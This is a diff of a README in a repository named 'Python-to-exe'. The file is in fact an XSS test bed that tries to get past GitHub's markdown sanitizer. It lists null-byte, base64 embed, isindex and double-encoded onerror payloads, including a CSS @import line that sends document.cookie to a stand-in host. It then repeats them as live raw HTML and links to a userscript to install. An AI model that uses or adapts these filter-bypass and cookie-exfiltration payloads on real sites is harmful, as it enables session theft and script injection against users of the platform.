@@ -1,52 +1,67 @@
 # Python-to-exe
 
-## 🎯 Direct Link (Works!)
+## 🎯 Top 5 Context-Challenging XSS Payloads
 
-[CLICK HERE FOR ALERT!](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)
+Testing different contexts where GitHub's defenses may fail:
 
-## Srcdoc Entity Encoding Payloads:
+### 1. The Null-Byte Separator
+Tests if WAF/Sanitizer can be confused by a null-byte (`%00`) inserted to bypass regex/string matching:
 
-<!-- Method 1: Srcdoc with entity encoding (basic) -->
-<iframe srcdoc="&lt;script&gt;alert('hi bearert0ken')&lt;/script&gt;"></iframe>
+```html
+<iframe%00/srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;">
+```
 
-<!-- Method 2: Srcdoc double encoded -->
-<iframe srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;"></iframe>
+### 2. The Embed Tag Variant (Base64)
+Tests if sanitizer misses the less-common `embed` tag with `data:` URI:
 
-<!-- Method 3: Srcdoc with HTML numeric entities -->
-<iframe srcdoc="&#60;script&#62;alert('hi bearert0ken')&#60;/script&#62;"></iframe>
+```html
+<embed/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGkgYmVhcmVydDBrZW4nKTwvc2NyaXB0Pg==">
+```
 
-<!-- Method 4: Srcdoc with img onerror (entity encoded) -->
-<iframe srcdoc="&lt;img src=x onerror=alert('hi_bearert0ken')&gt;"></iframe>
+### 3. CSS @import Exfiltration (Non-Script CSP Bypass)
+Tests if external CSS `@import` is allowed to exfiltrate data:
 
-<!-- Method 5: Srcdoc with SVG onload (entity encoded) -->
-<iframe srcdoc="&lt;svg onload=alert('hi bearert0ken')&gt;&lt;/svg&gt;"></iframe>
+```html
+<style>@import url("https://example.com/log?cookie="+document.cookie);</style>
+```
 
-<!-- Method 6: Srcdoc with body onload -->
-<iframe srcdoc="&lt;body onload=alert('hi bearert0ken')&gt;&lt;/body&gt;"></iframe>
+### 4. The Obscure `<isindex>` Element
+Tests for old, forgotten HTML element that WAFs might miss:
 
-<!-- Method 7: Srcdoc with input autofocus + onfocus -->
-<iframe srcdoc="&lt;input autofocus onfocus=alert('hi bearert0ken')&gt;"></iframe>
+```html
+<isindex/action="https://example.com/exfil">
+```
 
-<!-- Method 8: Srcdoc with button autofocus + onclick -->
-<iframe srcdoc="&lt;button autofocus onclick=alert('hi bearert0ken')&gt;x&lt;/button&gt;"></iframe>
+### 5. Double-Encoded Onerror with URL-Encoded Space
+Tests if attribute escaping is flawed with mixed encoding:
 
-<!-- Method 9: Srcdoc with form + button -->
-<iframe srcdoc="&lt;form onsubmit=alert('hi bearert0ken')&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;"></iframe>
+```html
+<img/src=x%20onerror=&quot;fetch('https://example.com')&quot;>
+```
 
-<!-- Method 10: Srcdoc with marquee + onstart -->
-<iframe srcdoc="&lt;marquee onstart=alert('hi bearert0ken')&gt;&lt;/marquee&gt;"></iframe>
+## Direct Methods (If Above Don't Work):
 
-<!-- Method 11: Triple nested entity encoding -->
-<iframe srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;"></iframe>
+[Click for Alert (Raw HTML)](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)
 
-<!-- Method 12: Srcdoc with fetch error handling -->
-<iframe srcdoc="&lt;script&gt;fetch('x').catch(()=&gt;alert('hi bearert0ken'))&lt;/script&gt;"></iframe>
+[GitHub Pages Alert](https://bearertoken1.github.io/Python-to-exe/)
 
-<!-- Method 13: Srcdoc with Promise rejection -->
-<iframe srcdoc="&lt;script&gt;Promise.reject().catch(()=&gt;alert('hi bearert0ken'))&lt;/script&gt;"></iframe>
+[Install Userscript](https://github.com/bearertoken1/Python-to-exe/raw/main/github-alert.user.js)
 
-<!-- Method 14: Srcdoc mixed case encoding -->
-<iframe srcdoc="&Lt;script&Gt;alert('hi bearert0ken')&Lt;/script&Gt;"></iframe>
+---
 
-<!-- Method 15: Srcdoc with decimal entities -->
-<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('hi bearert0ken')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"></iframe>
+## Live Payload Tests (Below):
+
+<!-- Payload 1: Null-Byte Separator -->
+<iframe%00/srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;"></iframe>
+
+<!-- Payload 2: Embed Tag with Base64 Data URI -->
+<embed/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGkgYmVhcmVydDBrZW4nKTwvc2NyaXB0Pg==">
+
+<!-- Payload 3: CSS @import (tests non-script CSP bypass) -->
+<style>@import url("https://example.com/log?cookie="+document.cookie);</style>
+
+<!-- Payload 4: Obscure isindex element -->
+<isindex/action="https://example.com/exfil">
+
+<!-- Payload 5: Double-Encoded Onerror -->
+<img/src=x%20onerror=&quot;fetch('https://example.com')&quot;>
